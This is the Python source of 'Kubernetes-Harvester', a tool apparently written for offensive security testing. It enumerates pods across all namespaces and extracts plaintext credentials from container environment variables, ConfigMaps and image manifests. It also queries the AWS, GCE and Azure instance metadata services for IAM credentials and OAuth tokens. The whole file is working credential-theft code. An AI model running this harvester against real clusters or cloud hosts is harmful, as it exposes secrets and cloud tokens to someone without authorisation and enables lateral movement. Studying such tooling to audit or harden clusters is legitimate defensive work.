#!/usr/bin/python
# Kubernetes-Harvester
# Try to gather potential creds from kubernetes
# Version: 1.0
# Author: Michael "Sleventyeleven" Contino

# import all of the things
import os
from kubernetes import client, config
import requests
import docker
import logging
import argparse
import json


class Harvester:
    """
    Primary Class for The Harvester

    :return: Instance of itself
    """

    def __init__(self):
        """
        Initial function for the Harvester
        Attempt to figure out authentication, connect to the kube api server, and then list all pods for all namespaces

        :return: None
        """

        # if the automountservicetoken seems to exist, use that else utilize default kube config for api authentication
        if os.path.exists('/var/run/secrets/kubernetes.io'):
            config.load_incluster_config()
            self.current_namespace = open("/var/run/secrets/kubernetes.io/serviceaccount/namespace").read()
        else:
            config.load_kube_config()
            try:
                self.current_namespace = config.list_kube_config_contexts()[1]['context']['namespace']
            except KeyError:
                logger.error('Your context does not contain a namespace, add a new contest or edit ~/.kube/config')

        # attempt to connect to the kube api server and then list all pods for all namespaces
        self.core_client = client.CoreV1Api()
        self.all_pods = self.core_client.list_pod_for_all_namespaces()

    def get_pod_map_all_namespaces(self):
        """
        get the pod specs for all pods in all namespaces and then create a pod_map dict with targeted data

        :return pod_map: dict of all pods targeted data
        """

        # initiate the pod map
        pod_map = {}

        # iterate through all pods
        for pod in self.all_pods.items:
            tmp_pod_env = {}
            tmp_env = []

            # for each container in the pod, note the env
            for container in pod.spec.containers:
                if container.env:
                    for env in container.env:
                        tmp_env.append(env)

                # parse the container image listed in pod spec for image and version tag
                raw_image = container.image
                try:
                    if ':' in raw_image:
                        image_name, image_version = raw_image.split(':')
                    else:
                        image_name = raw_image
                        image_version = None
                except ValueError:
                    continue

                # build the pod env data based on each pod container processed
                tmp_pod_env[container.name] = ({'name': container.name, 'env': tmp_env, 'image': image_name,
                                                'version': image_version})

            # add each pod's data to the pod_map for processing
            pod_map[pod.metadata.name] = {"namespace": pod.metadata.namespace, "containers": tmp_pod_env}

        return pod_map

    def parse_pod_map_for_creds(self, pod_map):
        """
        Parse the pod_map for potential credentials in environment variables
        :param pod_map: dict of all pods targeted data

        :return reported_issues: list of issues identified
        """

        # establish list of potential key values to search for
        credkey = ['pass', 'token', 'key']

        # initiate a list to hold potential issues
        reported_issues = []

        # iterate through each pod and container in the pod_map
        for pod in pod_map:
            for container in pod_map[pod]['containers']:
                for env in pod_map[pod]['containers'][container]['env']:

                    # for each key in credkey list, check to see if its within the env variable name
                    for key in credkey:
                        if key in env.name.lower():

                            # check if the env is loaded from another resource, if not continue to report the issue
                            if env.value_from is None:
                                logger.issue(
                                    'Found potential credential {0} in env of container {1} running in pod {2}'
                                    ' in namespace {3}'.format(
                                        env.name, container, pod, pod_map[pod]['namespace']))
                                reported_issues.append(
                                    {'name': env.name, 'value': env.value, 'container': container, 'pod': pod,
                                     'namespace': pod_map[pod]['namespace'], 'key': key, 'source': 'podEnv'})

                            else:

                                # if env is loaded from config map and not None (aka secret), check config map values
                                if env.value_from.config_map_key_ref is None:
                                    continue
                                else:

                                    # if it is a config map, request the configmap by name
                                    tmp_configmap = self.core_client.read_namespaced_config_map(
                                        env.value_from.config_map_key_ref.name, pod_map[pod]['namespace'])

                                    # report the potential config map
                                    logger.issue(
                                        'Found potential credential {0} in env configmap of container {1} running in'
                                        ' pod {2} in namespace {3}'.format(
                                            env.value_from.config_map_key_ref.key, container, pod,
                                            pod_map[pod]['namespace']))
                                    reported_issues.append({'name': env.value_from.config_map_key_ref.key,
                                                            'value': tmp_configmap.data[
                                                                env.value_from.config_map_key_ref.key],
                                                            'container': container, 'pod': pod,
                                                            'namespace': pod_map[pod]['namespace'], 'key': key,
                                                            'source': 'configmapEnv'})

                # initiate connection to docker api via local unix socket
                dockerclient = docker.APIClient()

                # build the full pullurl for the image, based on the parsed image and possible version
                if pod_map[pod]['containers'][container]['version'] is None:
                    tmp_pullurl = pod_map[pod]['containers'][container]['image']
                else:
                    tmp_pullurl = '{0}:{1}'.format(pod_map[pod]['containers'][container]['image'],
                                                   pod_map[pod]['containers'][container]['version'])

                # try to inspect the image via the built pullurl
                try:
                    tmp_manifest = dockerclient.inspect_image(tmp_pullurl)

                # if image is not found locally, try to pull it down
                except docker.errors.ImageNotFound:
                    try:
                        logger.info('Trying to pull image {0} since it was not found when requesting manifest'.format(
                            tmp_pullurl))
                        dockerclient.pull(pod_map[pod]['containers'][container]['image'],
                                          tag=pod_map[pod]['containers'][container]['version'])

                    # if the image pull fails, just continue to the next image
                    except docker.errors.APIError:
                        continue

                    # if pull is successful, inspect for the manifest
                    tmp_manifest = dockerclient.inspect_image(tmp_pullurl)

                #  check to see if there is any env within the manifest
                if tmp_manifest['ContainerConfig']['Env']:
                    for key in credkey:

                        # check to see if any of the keys are within env names
                        for tmp_env in tmp_manifest['ContainerConfig']['Env']:
                            if key in tmp_env.split('=')[0].lower():

                                # if key is within an env name, report as a potential issue
                                reported_issues.append({'name': tmp_env.split('=')[0], 'value': tmp_env.split('=')[1],
                                                        'container': container, 'pod': pod,
                                                        'namespace': pod_map[pod]['namespace'], 'key': key,
                                                        'source': 'manifestEnv'})
                                logger.issue(
                                    'Found a potential credential {0} in the manifest env of container {1} running in '
                                    'pod {2} in namespace {3}'.format(
                                        tmp_env.split('=')[0], container, pod, pod_map[pod]['namespace']))

        return reported_issues

    def try_to_gather_cloud_tokens(self):
        """
        try to gather auth tokens from internal api's of major cloud providers

        :return cloud_map: dict of cloud tokens/responses
        """

        # initiate cloud map dict
        cloud_map = {}

        # try to get a 200 response from the internal AWS API for token
        try:
            ra = requests.get('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
            if ra.status_code == 200:
                logger.issue("Successfully got AWS metadata API iam data")
                cloud_map['aws'] = ra.text
        except requests.exceptions.ConnectionError:
            logger.info('Could not get internal metadata from aws')

        # try to get a 200 response from the internal Google API for token
        try:
            rg = requests.get('http://metadata/computeMetadata/v1/instance/service-accounts/default/token',
                              headers={'Metadata-Flavor': 'Google'})
            if rg.status_code == 200:
                logger.issue("Successfully got GCE metadata API service account token")
                cloud_map['gce'] = rg.text
        except requests.exceptions.ConnectionError:
            logger.info('Could not get internal metadata from gce')

        # try to get a 200 response from the internal Azure API for oauth token
        try:
            rz = requests.get(
                'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F'
                '%2Fmanagement.azure.com%2F',
                headers={'Metadata': 'true'})
            if rz.status_code == 200:
                logger.issue("Successfully got Azure metadata API oauth token")
                cloud_map['az'] = rz.text
        except requests.exceptions.ConnectionError:
            logger.info('Could not get internal metadata from Azure')
        return cloud_map


if __name__ == '__main__':
    # Parse out all of the command line arguments
    parser = argparse.ArgumentParser(description='Try to gather potential creds from kubernetes')
    parser.add_argument('-v', '--verbose', help='Whether or not to display additional log information', required=False,
                        action='store_true')
    parser.add_argument('-w', '--write', help='Whether to write a log file, can be used with -0 to specify '
                                              'name/location', required=False, action='store_true')
    parser.add_argument('-o', '--outfile', help='The file to write results (needs to be writable for current user)',
                        required=False, default='harvester.json')
    args = parser.parse_args()

    # If the verbose option is passed, change default log level to INFO
    if args.verbose:
        logging.basicConfig(level=logging.INFO, format='[%(levelname)s]: %(message)s')
    else:
        logging.basicConfig(format='[%(levelname)s]: %(message)s')

    # Modify the default logger to include an issue log level between info and warn
    logging.ISSUE = 35
    logging.addLevelName(logging.ISSUE, 'ISSUE')
    logger = logging.getLogger()
    # Use a lambda to add issue attribute to logger for ease of use
    setattr(logger, 'issue', lambda message, *args: logger._log(logging.ISSUE, message, args))

    # create a new instance of our main harvester class
    new_harvester = Harvester()

    # Grab all pod specs from all namespaces and return the pod_map
    pod_map = new_harvester.get_pod_map_all_namespaces()
    logger.info('Requested all pod specs in all namespaces and got {0} pods'.format(len(pod_map)))

    # Parse the all pod secs in pod_map for possible credentials in ENV
    reported_issues = new_harvester.parse_pod_map_for_creds(pod_map)

    # try to get a http 200 for each major cloud providers internal API
    cloud_map = new_harvester.try_to_gather_cloud_tokens()

    logger.info(
        'Harvester completed with {0} potential credentials identified'.format(len(reported_issues) + len(cloud_map)))

    # If the write report argument is passed on the commandline, write to harvester.json or one provided via outfile arg
    if args.write:
        out_file = open(args.outfile, "w")
        json.dump({'issues': reported_issues}, out_file, indent=4)
        out_file.close()
